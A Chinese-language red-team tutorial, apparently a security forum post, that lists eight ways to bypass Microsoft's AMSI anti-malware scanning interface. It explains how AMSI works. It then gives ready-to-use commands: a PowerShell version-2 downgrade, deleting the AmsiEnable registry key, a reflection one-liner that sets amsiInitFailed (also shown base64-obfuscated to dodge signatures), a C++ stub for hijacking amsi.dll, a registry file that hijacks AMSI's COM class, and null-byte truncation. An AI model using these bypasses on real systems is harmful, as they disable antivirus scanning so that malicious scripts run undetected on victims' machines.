前言
--

AMSI是微软用来对抗无文件攻击而开发的安全模块，是当前攻防对抗前沿的技术 之一

从2015年AMSI出现，越来越多的杀软厂商接入了AMSI接口，当前市面上主流杀软均接入此接口

这给当时以powershell为主的红队工具致命打击，像Empire，等等

总体来说，由于AMSI仅仅是一个连接应用程序和杀软程序的通道，微软主要还是在defender上做各种对抗，针对通道本身的加固较少。

红队工具也寻找了另外一条出路就是.Net，使用C#开发的红队工具随之兴起。

随着以`.NET`(C#)为基础的攻击技术的逐渐成熟

AMSI在`.NET 4.8`引入了针对Assembly导入的内存扫描， 同时针对WMI的扫描也被加入到了AMSI当中

什么是AMSI
-------

AMSI全称(Antimalware Scan Interface)，反恶意软件扫描接口，他的本体是一个DLL文件

默认位置：`c:\windows\system32\amsi.dll`

![image-20211016161926115](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a22bcd7e809a3565a1dc905b8dffe0b4f6189d08.png)

它提供了通用的标准接口（COM接口、Win32 API）

这些接口中 Win32 API是为正常应用程序提供的，方便正常程序调用这些API针对用户输入做扫描。

COM接 口，是为杀软供应商提供的，方便杀软厂商接入自身针对恶意软件的识别能力

WIN32 API
---------

```php
AmsiCloseSession        关闭由 AmsiOpenSession 打开的会话。

AmsiInitialize          初始化 AMSI API。

AmsiNotifyOperation     向反恶意软件提供程序发送任意操作的通知。

AmsiOpenSession         打开可在其中关联多个扫描请求的会话。

AmsiResultIsMalware     确定扫描结果是否指示应阻止内容。

AmsiScanBuffer          扫描缓冲区中的内容中寻找恶意软件。

AmsiScanString          扫描字符串中的恶意软件。

AmsiUninitialize        删除 AmsiInitialize最初打开的 AMSI API 实例。
```

重点关注`AmsiScanBuffer、AmsiScanString、AmsiUacScan`这三个函数

AMSI在Windows中的作用
----------------

AMSI在windows系统中被直接或间接的调用，主要分布在以下程序

1.`用户账户控制`，也就是UAC（EXE、COM、MSI、ActiveX的安装）

```php
%windir%\System32\consent.exe 
```

2.`Powershell`（脚本、交互式使用、动态代码求值）

```php
System.Management.Automation.dll 
```

3.`Windows脚本宿主`

```php
wscript.exe cscript.exe 
```

4.`JavaScript、VBScript`

```php
%windir%\System32\jscript.dll %windir%\System32\vbscript.dll 
```

5.`Office VBA macros`

```php
VBE7.dll 
```

6.`.NET Assembly`

```php
clr.dll 
```

7.`WMI`

```php
%windir%\System32\wbem\fastprox.dll
```

Bypass AMSI-1
-------------

### 降级攻击

#### 原理

简单来说 使用低版本(2.0)的PowerShell来执行攻击脚本，因为在低版本的 powershell上没有AMSI

#### 预装情况

<https://4sysops.com/wiki/differences-between-powershell-versions>

![image-20211016155905112](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b1df351b798e6355c7c251869dd728d8f14da8b0.png)

AMSI是在Win10、 WinServer2016开始使用的

#### 判断使用

我们需要在使用前自己探测是否可以使用

```php
注:非管理员权限
Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -recurse | GetItemProperty -name Version -EA 0 | Where { $_.PSChildName -match '^(?!S)\p{L}'} | Select -ExpandProperty Version

注：需要管理员权限
Win10:
Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2

Win2016/Win2019:
Get-WindowsFeature PowerShell-V2
```

#### 实操

在命令行中：直接使用`powershell.exe -version 2`改变运行版本

![image-20211016162350929](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e530dc832aad28edacc4ab5b3a3fdfa5a3668c61.png)

在脚本中：在脚本开头加入 `#requires -version 2`

这样如果可以使用2.0，脚本会以2.0执行，如果不能，会按照当前powershell版 本执行

注：**不是所有powershell脚本都能在2.0上执行，需要注意攻击脚本是否支持2.0**

Bypass AMSI-2
-------------

### 改注册表

#### 实操

修改注册表

```php
HKLM:\Software\Microsoft\Windows Script\Settings\AmsiEnable
```

设置为 0，以禁用 AMSI

```php
Remove-Item -Path "HKLM:\Software\Microsoft\Windows Script\Settings\AmsiEnable" -Recurse
```

但是，改注册表并不是一种隐秘的方法，并且还需要管理员权限

Bypass AMSI-3
-------------

### 脚本混淆

#### amsi.dll工作流程

我们先来看amsi.dll的工作流程，方便我们去理解脚本混淆 为什么可以绕过amsi.dll

![image-20211016162536060](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7f83753fcaf5ae74e97d6349fe9955d8164f096e.png)

AMSI其实只是一个 通道，真正识别是否是恶意软件或脚本的还是杀毒软件

AMSI把我们的恶意脚本交给杀毒软件，杀毒软件做识别。

大部分杀毒软件的识别方式还是特征码的方式，当 然杀毒软件也会把样本传到云端做机器学习或者人工分析，最后再反馈特征库给杀毒软件，导致我们恶意脚本被杀

### 关闭AMSI

#### 原理

既然AMSI只是一个通道，那么我们就可以把这个通道关闭，也就下一步阻断了杀毒软件

利用反射直接把判断是否要使用杀毒软件 进行扫描的变量始终改成false。这样AMSI就不会把我们的恶意脚本交给杀毒软件，而是直接返回 `AMSI_RESULT_NOT_DETECTED`

#### 实操

```php
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiI nitFailed','NonPublic,Static').SetValue($null,$true)
```

由于这一行命令也是脚本，自身也会被AMSI传递给杀毒软件

### 两者结合

我们可以使用脚本混淆关闭AMSI的一行命令，进行绕过AMSI

#### 两个关键点：

1.查杀的关键字符

`System.Management.Automation.AmsiUtils` 和 `amsiInitFailed`

2.编码解码

#### 实操

进行base64编码

```php
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

Bypass AMSI-4
-------------

### 暴力卸载amsi.dll

在powershell启动的时候，会加载amsi.dll，然后调用其中的AmsiScanString或AmsiScanBuffer函数来进行检测

那么我们可以暴力卸载amsi.dll，但是我们要去考虑powershell进程也会崩掉

使用工具process hacker

<https://processhacker.sourceforge.io/downloads.php>

![image-20211016202005984](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a0313f6eda3dbf7b852efa9e89ef451d3913eaeb.png)

![image-20211016202040657](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ee1816a97fedf3d052b06f673e99c9bcd5def26e.png)

Unpload之后就卸载了

不建议使用

Bypass AMSI-5(重点关注)
-------------------

### 劫持amsi.dll

### 原理

由于研发人员使用 LoadLibrary函数导入dll的时候没有使用绝对路径，因此程序会首先在当前目录下寻找dll

因此我们在 powershell.exe同目录下放一个amsi.dll做劫持

`amsi.dll`的默认目录：`c:\windows\system32\amsi.dll`

还要考虑`amsi.dll`的导出函数，上面也有所提及

但是官方文档也是不全的，文档比较老了，目前新的amsi增加了其他几个导出函数

我这里使用了一个工具AheadLib

用IDA 分析 原理是一样的

![image-20211016204700088](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ea82856c337567216d54143fb5c2113d2de8ad39.png)

```php
#include "pch.h"
#include "iostream"

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        LPCWSTR appName = NULL;
        typedef struct HAMSICONTEXT {
            DWORD       Signature;            // "AMSI" or 0x49534D41
            PWCHAR      AppName;           // set by AmsiInitialize
            DWORD       Antimalware;       // set by AmsiInitialize
            DWORD       SessionCount;      // increased by AmsiOpenSession
        } HAMSICONTEXT;
        typedef enum AMSI_RESULT {
            AMSI_RESULT_CLEAN,
            AMSI_RESULT_NOT_DETECTED,
            AMSI_RESULT_BLOCKED_BY_ADMIN_START,
            AMSI_RESULT_BLOCKED_BY_ADMIN_END,
            AMSI_RESULT_DETECTED
        } AMSI_RESULT;

        typedef struct HAMSISESSION {
            DWORD test;
        } HAMSISESSION;

        typedef struct r {
            DWORD r;
        };

        void AmsiInitialize(LPCWSTR appName, HAMSICONTEXT * amsiContext);
        void AmsiOpenSession(HAMSICONTEXT amsiContext, HAMSISESSION * amsiSession);
        void AmsiCloseSession(HAMSICONTEXT amsiContext, HAMSISESSION amsiSession);
        void AmsiResultIsMalware(r);
        void AmsiScanBuffer(HAMSICONTEXT amsiContext, PVOID buffer, ULONG length, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT * result);
        void AmsiScanString(HAMSICONTEXT amsiContext, LPCWSTR string, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT * result);
        void AmsiUninitialize(HAMSICONTEXT amsiContext);
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

### 缺点

1.目录都需要管理员权限

2.落地的amsi.dll文件，这个dll文件需要考虑免杀问题

Bypass AMSI-6
-------------

### 绕过AmsiScanBuffer()

AmsiScanBuffer它本质上是用于扫描脚本内容的函数

函数原型

```php
HRESULT AmsiScanBuffer(
  [in]           HAMSICONTEXT amsiContext,
  [in]           PVOID        buffer,
  [in]           ULONG        length,
  [in]           LPCWSTR      contentName,
  [in, optional] HAMSISESSION amsiSession,
  [out]          AMSI_RESULT  *result
);
```

![image-20211016165309526](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2a615ae8d23d645de3bd2a764245a6f5c8223b09.png)

关注函数中的这个参数，`length`是绕过的关键

此参数包含要扫描的字符串的长度。如果通过某种方式将该参数设置为常量值 0，则 AMSI 将有效地被绕过

具体可以看这里：<https://secureyourit.co.uk/wp/2019/05/10/dynamic-microsoft-office-365-amsi-in-memory-bypass-using-vba/>

### 函数工作流程

1.在PowerShell 命令提示符中，任何提供的内容将首先发送到 `AmsiScanBuffer()`，然后再执行  
2.`AmsiScanBuffer()`将检查已注册的防病毒软件以确定是否已创建任何签名  
3.如果内容被认为是恶意的，它将被阻止

Bypass AMSI-7
-------------

### COM Server劫持

#### 原理

amsi.dll在老版本中使用 `CoCreateInstance()`函数调用`IID`和`CLSID`来实例化COM接口

而这个函数会先从注册表HKCU中找对应的DLL，也就是当前用户，因此我们创建相应的注册表，让它调用失败就行了

```php
Windows Registry Editor Version 5.00
[HKEY_CURRENT_USER\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba4357bb0072ec}]

[HKEY_CURRENT_USER\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba4357bb0072ec}\InProcServer32]
@="C:\\goawayamsi.dll"
```

#### 思考

微软修复了这个问题

通过直接调用 amsi.dll 的 `DllGetClassObject()` 函数替换 `CoCreateInstance()`， 可以避免注册表解析

但是我们可以自己编译的 amsi.dll换成微软的老amsi.dll，这个dll可是微软自己签名的dll，不会被杀，然后再劫持注册表

Bypass AMSI-8
-------------

### Null字符绕过

#### 绕过AmsiScanString()

函数原型

```php
HRESULT AmsiScanString(
  [in]           HAMSICONTEXT amsiContext,
  [in]           LPCWSTR      string,
  [in]           LPCWSTR      contentName,
  [in, optional] HAMSISESSION amsiSession,
  [out]          AMSI_RESULT  *result
);
```

其中string传入的就是我们的脚本，这个地方可以空字符截断（ps:空字符截断真是随处可见），然后我 们只需在我们恶意脚本开头加入空字符，就可以bypass了

微软的修复方法

调用其他函数-&gt;AmsiScanBuffer

总结
--

AMSI 作为阻止恶意软件执行的第一道防线，重要性不言而喻

由于扫描是基于签名的红队，威胁行为者可以通过采取各种策略来逃避AMSI

希望此文可以帮到各位师傅！